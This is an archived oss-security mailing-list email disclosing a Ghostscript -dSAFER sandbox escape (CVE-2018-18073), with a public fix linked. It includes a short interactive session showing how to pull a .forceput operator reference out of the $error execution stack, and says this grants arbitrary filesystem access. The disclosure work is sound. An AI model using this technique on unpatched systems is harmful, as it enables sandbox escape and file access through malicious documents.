X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1518" "Wednesday" "10" "October" "2018" "11:01:47" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFk+W_v0K2UuOF-Oi1a9GB5dDt4K4T_X=hhJycDcE7n=yLA@mail.gmail.com>" "43" "[oss-security] ghostscript: saved execution stacks can leak operator arrays (CVE-2018-18073)" nil nil nil "10" "2018101018:01:47" "[oss-security] ghostscript: saved execution stacks can leak operator arrays (CVE-2018-18073)" (number mark "U       taviso@googl Oct 10   43/1518  " thread-indent "\"[oss-security] ghostscript: saved execution stacks can leak operator arrays (CVE-2018-18073)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 19671 invoked by uid 550); 10 Oct 2018 18:02:12 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 19653 invoked from network); 10 Oct 2018 18:02:11 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=G2+IVEnD2OOu3cKCuOSorR5n05IIgZLrZddlrZF/440=;
        b=JE4T/gQTjCYiJJpUfTk14HDGd//a+XE5bE5NtXdUHRWpRGljMYI6pDvZmEfh+cyOvi
         ukIpJ24v6sbzh1mRl07XWVRk0fgSVzRkTbdNYokwIdbQ9prZ6YnSWdke14094suscVIs
         wfbLNZyNCBBGzmnUwoHJG5OnMcrRgOg4E4CkFjIaC3Tj9Kn/E9MlRD4jV07evIm7AMFP
         yKnrL+YD8kjAq1vxJ3jHZDnvDMaE9jJEw4gc14jDPS5XSM/tej0BKedlpUi9SrARypo8
         72qmAN1rBypHTvkKcNBEghRrv/RyJr6d3fwDZQtTVExTCzxcu490apCzZoTd8JYSU7GW
         zlmQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=G2+IVEnD2OOu3cKCuOSorR5n05IIgZLrZddlrZF/440=;
        b=UP6VBjfI0heGJTPAgm6v8PXG2CTCGqXGAXuwBKYzdR9Tyozk93ev5pQs9DqXMgX32t
         OXbJEsCvOoruk782jsoabNFoLmd/IMEK4CdMUCn2a+7Bo+LoGOaX3AERh8T5Z2b2x/U/
         duEiJ2RQGtrvrF/9Ibfh++PZYfbyYWzu4KIg3MujtGJTPJjQnKNbK84ZwsoA2cJbLRlD
         PKB9sX71YwDkKaR7TbsKB98jgIUIYPUTA8b/yQyzmHm5qpXvhDN0FR3ZHYwyiICRWfxR
         SD+sAprRzt05cR0aahQbpAiClyxJOAoVgnhTtXqHQzvswdpQzc5BW6dL3YHW1qjDOw2r
         D7sw==
X-Gm-Message-State: ABuFfogvVYo2j7wxbKuDWyYmnveFG2VIqQmucKC6yTnGCOsJwuisInBv
	S4p3hbXqdMrNfdm75HXD7k2bjyOhb/FU19akMfQ5HrzPEMjIJA==
X-Google-Smtp-Source: ACcGV61IUvaXb8T9EI8kfRSBfkXSSllUck16kudVMoqy0oTC91H421G3o5AXzTh4+2TAS8Lm+ImVRKbU0gaQWxJR3SU=
X-Received: by 2002:a37:a141:: with SMTP id k62-v6mr27023467qke.276.1539194519479;
 Wed, 10 Oct 2018 11:01:59 -0700 (PDT)
MIME-Version: 1.0
From: Tavis Ormandy <taviso@google.com>
Date: Wed, 10 Oct 2018 11:01:47 -0700
Message-ID: <CAJ_zFk+W_v0K2UuOF-Oi1a9GB5dDt4K4T_X=hhJycDcE7n=yLA@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="000000000000934f7c0577e3a6eb"
Subject: [oss-security] ghostscript: saved execution stacks can leak operator arrays (CVE-2018-18073)

--000000000000934f7c0577e3a6eb
Content-Type: text/plain; charset="UTF-8"

Hello, this <https://bugs.chromium.org/p/project-zero/issues/detail?id=1690>
is another (different from CVE-2018-17961) -dSAFER sandbox escape.

There are a whole bunch of different stacks in postscript, there's the
operand stack, the dict stack, the execution stack, and so on.

When the error handler is invoked in postscript, part of the execution
context is passed to the handler so that it can examine what went wrong.
That context is called `$error`, and could have included parts of
executeonly routines, and therefore could leak references to system
operators.

$ gs -dSAFER -sDEVICE=ppmraw
GS>{ null .setglobal } stopped clear
GS>$error /estack get ==
[...  {-dict- /FontDirectory --.currentglobal-- {-dict-}
{/LocalFontDirectory --.systemvar--} --ifelse-- --.forceput-- --pop--}]

Notice the .forceput in there...

GS>$error /estack get 29 get ==
{-dict- /FontDirectory --.currentglobal-- {-dict-} {/LocalFontDirectory
--.systemvar--} --ifelse-- --.forceput-- --pop--}
GS>$error /estack get 29 get 6 get ==
--.forceput--
GS>

Once you have a reference to forceput, you can do anything you like, see
the exploit for CVE-2018-18073 as an example of abusing forceput to get
arbitrary filesystem access.

The fix is public now, this is the commit to fix it:

http://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=34cc326eb2c5695833361887fe0b32e8d987741c

This was ghostscript bug 699927.

Thanks, Tavis.

--000000000000934f7c0577e3a6eb--
